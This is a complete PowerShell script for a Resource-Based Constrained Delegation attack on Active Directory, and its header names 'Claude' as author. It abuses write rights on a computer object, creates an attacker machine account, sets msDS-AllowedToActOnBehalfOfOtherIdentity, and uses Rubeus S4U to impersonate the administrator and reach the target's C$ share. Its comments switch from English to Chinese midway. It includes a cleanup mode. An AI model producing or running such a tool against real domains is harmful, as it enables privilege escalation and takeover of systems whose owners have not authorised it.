# Resource-Based Constrained Delegation (RBCD) Attack Script
# Author: Claude
# Description: This script executes RBCD attack, converting GenericWrite permissions to system access
# Prerequisites: 
# 1. Current account has GenericWrite/WriteDACL/WriteProperty permissions on target computer object
# 2. Domain MachineAccountQuota>0 allows creating computer accounts
# 3. PowerView and Powermad are loaded
# 4. Rubeus tool is available

# Parameter setup
param(
    [Parameter(Mandatory=$true)]
    [string]$TargetComputer,  # Target computer name, e.g. "appsrv01"
    
    [Parameter(Mandatory=$false)]
    [string]$AttackerComputer = "RBCD-Attack-$(Get-Random -Minimum 1000 -Maximum 9999)",  # Attacker-created computer account name
    
    [Parameter(Mandatory=$false)]
    [string]$Password = "Password123!",  # Password for attacker-created computer account
    
    [Parameter(Mandatory=$false)]
    [string]$Domain = $env:USERDOMAIN,  # Target domain, defaults to current user domain
    
    [Parameter(Mandatory=$false)]
    [string]$ImpersonateUser = "administrator",  # User to impersonate, defaults to administrator
    
    [Parameter(Mandatory=$false)]
    [string]$Service = "CIFS",  # Target service, defaults to CIFS file share
    
    [Parameter(Mandatory=$false)]
    [switch]$VerifyOnly,  # Only verify permissions, don't execute attack
    
    [Parameter(Mandatory=$false)]
    [switch]$Cleanup,  # Clean up created computer account and modified attributes
    
    [Parameter(Mandatory=$false)]
    [string]$RubeusPath = ".\Rubeus.exe"  # Path to Rubeus tool
)

function Test-ModulesLoaded {
    $powermadLoaded = Get-Command New-MachineAccount -ErrorAction SilentlyContinue
    $powerviewLoaded = Get-Command Get-DomainComputer -ErrorAction SilentlyContinue
    
    if (-not $powermadLoaded) {
        Write-Error "Powermad module not loaded! Please use: Import-Module .\Powermad.ps1"
        return $false
    }
    
    if (-not $powerviewLoaded) {
        Write-Error "PowerView module not loaded! Please use: . .\PowerView.ps1"
        return $false
    }
    
    if (-not (Test-Path $RubeusPath)) {
        Write-Error "Rubeus tool not found! Please ensure path is correct: $RubeusPath"
        return $false
    }
    
    return $true
}

function Check-MachineAccountQuota {
    try {
        $quota = Get-DomainObject -Identity $Domain -Properties ms-DS-MachineAccountQuota | 
                 Select-Object -ExpandProperty ms-DS-MachineAccountQuota
        
        Write-Host "[+] Current domain machine account quota (ms-DS-MachineAccountQuota): $quota" -ForegroundColor Green
        
        if ($quota -lt 1) {
            Write-Error "Machine account quota is less than 1, cannot create new computer accounts"
            return $false
        }
        return $true
    }
    catch {
        Write-Error "Error checking machine account quota: $_"
        return $false
    }
}

function Check-TargetWritePermission {
    try {
        Write-Host "[*] Checking write permissions on target computer object..." -ForegroundColor Yellow
        
        $targetDN = Get-DomainComputer -Identity $TargetComputer -Properties distinguishedname | 
                    Select-Object -ExpandProperty distinguishedname
        
        if (-not $targetDN) {
            Write-Error "Target computer object $TargetComputer not found"
            return $false
        }
        
        $acl = Get-ObjectAcl -ResolveGUIDs -Identity $targetDN | 
               ForEach-Object {
                   $_ | Add-Member -NotePropertyName Identity -NotePropertyValue (ConvertFrom-SID $_.SecurityIdentifier.value) -Force
                   $_
               } | 
               Where-Object {$_.Identity -eq "$env:USERDOMAIN\$env:USERNAME"}
        
        # Check if ACL has write permissions
        $hasWritePermission = $acl | Where-Object {
            $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl|WriteProperty|WriteOwner"
        }
        
        if ($hasWritePermission) {
            $rights = $hasWritePermission.ActiveDirectoryRights -join ", "
            Write-Host "[+] Current user has write permissions on target computer: $rights" -ForegroundColor Green
            return $true
        }
        else {
            Write-Error "Current user doesn't have required write permissions on target computer $TargetComputer"
            return $false
        }
    }
    catch {
        Write-Error "Error checking write permissions: $_"
        return $false
    }
}

function Create-AttackerComputer {
    try {
        Write-Host "[*] Creating attacker-controlled computer account: $AttackerComputer" -ForegroundColor Yellow
        
        # Check if computer account already exists
        $existingComputer = Get-DomainComputer -Identity $AttackerComputer -ErrorAction SilentlyContinue
        
        if ($existingComputer) {
            Write-Host "[!] Computer account $AttackerComputer already exists, will reuse" -ForegroundColor Yellow
            return $true
        }
        
        # Create computer account
        $securePassword = ConvertTo-SecureString $Password -AsPlainText -Force
        $result = New-MachineAccount -MachineAccount $AttackerComputer -Password $securePassword -Verbose
        
        if ($result) {
            Write-Host "[+] Successfully created computer account $AttackerComputer" -ForegroundColor Green
            
            # Verify computer account was created successfully
            $newComputer = Get-DomainComputer -Identity $AttackerComputer -ErrorAction SilentlyContinue
            if ($newComputer) {
                return $true
            }
        }
        
        Write-Error "Failed to create computer account"
        return $false
    }
    catch {
        Write-Error "Error creating computer account: $_"
        return $false
    }
}

function Configure-RBCD {
    try {
        Write-Host "[*] Configuring RBCD - modifying target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute..." -ForegroundColor Yellow
        
        # Get the attacker computer account's SID
        $attackerSID = Get-DomainComputer -Identity $AttackerComputer -Properties objectsid | 
                       Select-Object -ExpandProperty objectsid
        
        if (-not $attackerSID) {
            Write-Error "Unable to get SID for $AttackerComputer"
            return $false
        }
        
        Write-Host "[+] Attacker computer SID: $attackerSID" -ForegroundColor Green
        
        # Create security descriptor
        $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($attackerSID))"
        $SDBytes = New-Object byte[] ($SD.BinaryLength)
        $SD.GetBinaryForm($SDBytes, 0)
        
        # Set the target computer's msDS-AllowedToActOnBehalfOfOtherIdentity attribute
        Get-DomainComputer -Identity $TargetComputer | 
            Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
        
        # Verify attribute was set successfully
        $targetComputer = Get-DomainComputer -Identity $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
        $rbcdValue = $targetComputer | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
        
        if ($rbcdValue) {
            # Parse security descriptor to verify configuration
            $Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $rbcdValue, 0
            $DescriptorSID = $Descriptor.DiscretionaryAcl.SecurityIdentifier.Value
            
            if ($DescriptorSID -eq $attackerSID) {
                Write-Host "[+] RBCD configuration successful! Verified msDS-AllowedToActOnBehalfOfOtherIdentity attribute is set" -ForegroundColor Green
                return $true
            }
        }
        
        Write-Error "RBCD configuration verification failed"
        return $false
    }
    catch {
        Write-Error "Error configuring RBCD: $_"
        return $false
    }
}

function Get-TargetAccess {
    try {
        Write-Host "[*] Using Rubeus to get target access..." -ForegroundColor Yellow
        
        # Calculate NTLM hash
        $ntlmHash = Invoke-Command -ScriptBlock {
            Add-Type -AssemblyName System.Security
            $passwordBytes = [System.Text.Encoding]::Unicode.GetBytes($using:Password)
            $md4 = New-Object System.Security.Cryptography.MD4CryptoServiceProvider
            $hashBytes = $md4.ComputeHash($passwordBytes)
            $ntlmHash = [System.BitConverter]::ToString($hashBytes).Replace("-", "").ToLower()
            return $ntlmHash
        }
        
        if (-not $ntlmHash) {
            # If built-in method fails, use Rubeus hash to calculate hash
            Write-Host "[*] Using Rubeus to calculate NTLM hash..." -ForegroundColor Yellow
            $hashOutput = & $RubeusPath hash /password:$Password
            
            # Extract hash from output
            $ntlmHash = $hashOutput | Select-String "rc4_hmac" | Select-Object -First 1
            if ($ntlmHash -match "rc4_hmac\s+:\s+([0-9A-F]+)") {
                $ntlmHash = $Matches[1]
            }
            else {
                Write-Error "Unable to calculate NTLM hash using Rubeus"
                return $false
            }
        }
        
        Write-Host "[+] Computer account NTLM hash: $ntlmHash" -ForegroundColor Green
        
        # Build complete service SPN
        $targetFQDN = (Get-DomainComputer -Identity $TargetComputer -Properties dnshostname).dnshostname
        $serviceSPN = "$Service/$targetFQDN"
        
        Write-Host "[*] Using S4U to request service ticket for $serviceSPN as $ImpersonateUser..." -ForegroundColor Yellow
        
        # Use Rubeus to perform S4U attack
        $command = "$RubeusPath s4u /user:$AttackerComputer$ /rc4:$ntlmHash /impersonateuser:$ImpersonateUser /msdsspn:$serviceSPN /ptt"
        Write-Host "[*] Executing command: $command" -ForegroundColor Yellow
        
        $s4uOutput = Invoke-Expression $command
        
        # Check if Rubeus output indicates success
        if ($s4uOutput -match "Ticket successfully imported" -or $s4uOutput -match "Successfully imported") {
            Write-Host "[+] Service ticket successfully injected into current session!" -ForegroundColor Green
            
            # Verify ticket using klist
            Write-Host "[*] Verifying ticket..." -ForegroundColor Yellow
            $tickets = klist
            $targetTicket = $tickets | Select-String -Pattern $TargetComputer
            
            if ($targetTicket) {
                Write-Host "[+] Ticket verification successful! You can now access the target system" -ForegroundColor Green
                
                # If it's CIFS service, try to list C$ share
                if ($Service -eq "CIFS") {
                    Write-Host "[*] Attempting to access \\$targetFQDN\C$ ..." -ForegroundColor Yellow
                    try {
                        $files = Get-ChildItem "\\$targetFQDN\C$" -ErrorAction Stop
                        Write-Host "[+] Successfully accessed C$ share! Found $(($files | Measure-Object).Count) files/folders" -ForegroundColor Green
                        return $true
                    }
                    catch {
                        Write-Error "Cannot access C$ share: $_"
                        return $false
                    }
                }
                return $true
            }
        }
        
        Write-Error "Failed to get service ticket"
        return $false
    }
    catch {
        Write-Error "Error executing S4U attack: $_"
        return $false
    }
}

function Cleanup-RBCD {
    try {
        Write-Host "[*] 正在清理..." -ForegroundColor Yellow
        
        # 1. 重置目标计算机的msDS-AllowedToActOnBehalfOfOtherIdentity属性
        Write-Host "[*] 重置目标计算机的RBCD配置..." -ForegroundColor Yellow
        Get-DomainComputer -Identity $TargetComputer | 
            Set-DomainObject -Clear 'msds-allowedtoactonbehalfofotheridentity'
        
        # 验证清理
        $targetComputer = Get-DomainComputer -Identity $TargetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
        $rbcdValue = $targetComputer | Select-Object -ExpandProperty msds-allowedtoactonbehalfofotheridentity
        
        if (-not $rbcdValue) {
            Write-Host "[+] 目标计算机RBCD配置已重置" -ForegroundColor Green
        }
        else {
            Write-Host "[!] 警告: 目标计算机RBCD配置未能完全重置" -ForegroundColor Red
        }
        
        # 2. 删除创建的计算机账户
        Write-Host "[*] 删除创建的计算机账户 $AttackerComputer ..." -ForegroundColor Yellow
        
        # 使用ADSI删除计算机账户
        $computerDN = (Get-DomainComputer -Identity $AttackerComputer).distinguishedname
        if ($computerDN) {
            $root = New-Object System.DirectoryServices.DirectoryEntry("LDAP://RootDSE")
            $domainNC = $root.defaultNamingContext
            $adsi = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$domainNC")
            $deleteEntry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$computerDN")
            $adsi.Children.Remove($deleteEntry)
            
            # 验证删除
            $verifyDelete = Get-DomainComputer -Identity $AttackerComputer -ErrorAction SilentlyContinue
            if (-not $verifyDelete) {
                Write-Host "[+] 计算机账户已成功删除" -ForegroundColor Green
            }
            else {
                Write-Host "[!] 警告: 计算机账户未能成功删除" -ForegroundColor Red
            }
        }
        else {
            Write-Host "[!] 找不到计算机账户 $AttackerComputer，可能已被删除" -ForegroundColor Yellow
        }
        
        # 3. 清理票据
        Write-Host "[*] 清理Kerberos票据..." -ForegroundColor Yellow
        klist purge | Out-Null
        Write-Host "[+] 票据已清理" -ForegroundColor Green
        
        Write-Host "[+] 清理完成" -ForegroundColor Green
        return $true
    }
    catch {
        Write-Error "清理过程中出错: $_"
        return $false
    }
}

# 主执行流程
function Execute-RBCDAttack {
    # 检查模块和工具
    if (-not (Test-ModulesLoaded)) {
        Write-Error "所需模块或工具未加载，无法继续"
        return
    }
    
    # 显示设置信息
    Write-Host "=== Resource-Based Constrained Delegation (RBCD) 攻击 ===" -ForegroundColor Cyan
    Write-Host "目标计算机: $TargetComputer" -ForegroundColor Cyan
    Write-Host "攻击者计算机: $AttackerComputer" -ForegroundColor Cyan
    Write-Host "目标域: $Domain" -ForegroundColor Cyan
    Write-Host "模拟用户: $ImpersonateUser" -ForegroundColor Cyan
    Write-Host "目标服务: $Service" -ForegroundColor Cyan
    Write-Host "============================================" -ForegroundColor Cyan
    
    # 如果是清理模式，直接执行清理
    if ($Cleanup) {
        Cleanup-RBCD
        return
    }
    
    # 检查机器账户配额
    if (-not (Check-MachineAccountQuota)) {
        return
    }
    
    # 检查目标计算机的写权限
    if (-not (Check-TargetWritePermission)) {
        return
    }
    
    # 如果只验证权限，到这里就返回
    if ($VerifyOnly) {
        Write-Host "[+] 验证模式: 当前用户对目标计算机有必要的权限，RBCD攻击可行" -ForegroundColor Green
        return
    }
    
    # 创建攻击者计算机账户
    if (-not (Create-AttackerComputer)) {
        return
    }
    
    # 配置RBCD
    if (-not (Configure-RBCD)) {
        return
    }
    
    # 获取目标访问权限
    if (-not (Get-TargetAccess)) {
        return
    }
    
    Write-Host "[+] RBCD攻击成功完成!" -ForegroundColor Green
    Write-Host "[*] 要清理所有更改，请运行: $($MyInvocation.MyCommand.Name) -TargetComputer $TargetComputer -AttackerComputer $AttackerComputer -Cleanup" -ForegroundColor Yellow
}

# 执行攻击
Execute-RBCDAttack
